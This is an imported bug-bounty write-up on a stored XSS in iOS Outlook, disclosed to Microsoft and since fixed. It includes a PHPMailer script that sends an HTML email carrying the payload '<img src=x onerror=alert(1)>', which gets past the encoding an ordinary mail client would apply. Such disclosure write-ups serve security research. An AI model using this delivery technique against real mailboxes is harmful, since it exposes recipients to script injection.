---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-05-28_ios-outlook-stored-xss-write-up3000.md
original_filename: 2020-05-28_ios-outlook-stored-xss-write-up3000.md
title: iOS Outlook Stored XSS Write-Up($3000)
category: documents
detected_topics:
- xss
- command-injection
- cors
- mobile-security
tags:
- imported
- documents
- xss
- command-injection
- cors
- mobile-security
language: en
raw_sha256: 762849605d608700c0e61d5a21e36959e47c14660cc2dca925287c912b6ac090
text_sha256: ce53b1fe95b9804dfddee363faf08de79c3f8c9789468b5662b7461a81fa39dc
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: true
---

# iOS Outlook Stored XSS Write-Up($3000)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-05-28_ios-outlook-stored-xss-write-up3000.md
- Source Type: markdown
- Detected Topics: xss, command-injection, cors, mobile-security
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: True
- Raw SHA256: `762849605d608700c0e61d5a21e36959e47c14660cc2dca925287c912b6ac090`
- Text SHA256: `ce53b1fe95b9804dfddee363faf08de79c3f8c9789468b5662b7461a81fa39dc`


## Content

---
title: "iOS Outlook Stored XSS Write-Up($3000)"
url: "https://medium.com/@kminthein/ios-outlook-stored-xss-write-up-ce34d7da192b"
authors: ["kminthein / weev3 (@kyawminthein99)"]
programs: ["Microsoft"]
bugs: ["XSS"]
bounty: "3,000"
publication_date: "2020-05-28"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4557
scraped_via: "browseros"
---

# iOS Outlook Stored XSS Write-Up($3000)

iOS Outlook Stored XSS Write-Up($3000)
kminthein
Follow
2 min read
·
May 28, 2020

18

Staying home is really nightmare for me and I am so boring to learn new things. So, I decided to write a writeup about how I found stored XSS in Micorsoft outook and got some bounty $3000.

I stopped hunting bugs since last 3 years ago after I got some bounty from Yahoo, Tumblr ..etc. Last few months ago, my old tested payload from shopify pop-up in my Microsoft outlook email. So I started to dig around, I sent every XSS payload including polyglots to my Microsoft account but nothing seems showing an alert. After hours of struggling, I reported to MSRC with below message, lol. I though I am idiot.

Press enter or click to view image in full size

And as expected, MSRC reply need more info. I know there is XSS bug in Microsoft outlook and I just didn’t found the endpoint. After thinking some hours, I started thinking about what if sending email client validate and encode my payload?. If my payload is standardized from sender side, there won’t be no vuln point in receiver side which is Microsoft outlook. So I decided to write a simple php script in order send my message to outlook.

The script that I used to send XSS payload to outlook is below.

<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
require ‘vendor/autoload.php’;
$mail = new PHPMailer(true);
try {
//Server settings
$mail->SMTPDebug = 2;
$mail->isSMTP();
$mail->Host = ‘smtp.gmail.com’;
$mail->SMTPAuth = true;
$mail->Username = ‘mymail@gmail.com’;
$mail->Password=***REDACTED***
$mail->SMTPSecure = ‘tls’;
$mail->Port = 587;
//Recipients
$mail->setFrom(‘mymail@gmail.com’, ‘kmt’);
$mail->addAddress(‘receiver@outlook.com’, ‘’);
//Content
$mail->isHTML(true);
$mail->Subject = ‘XSS POC’;
$mail -> Body = “<img src=x onerror=alert(1)>”;
$mail->send();
echo ‘Message has been sent’;
} catch (Exception $e) {
echo ‘Message could not be sent. Mailer Error: ‘, $mail->ErrorInfo;
}
?>

Get kminthein’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

After firing the script and watch my outlook mail box. Boom, XSS and seems office365 is also affected.

You can view PoC video from here.

After fixing the bug I was awarded $3000 from MSRC.

Press enter or click to view image in full size
Conclusion

In above scenario, I strongly believe my sender email client encode my payload before sending to outlook there is no more XSS in outlook. So I choose to write simple PHP script with PHP mailer.
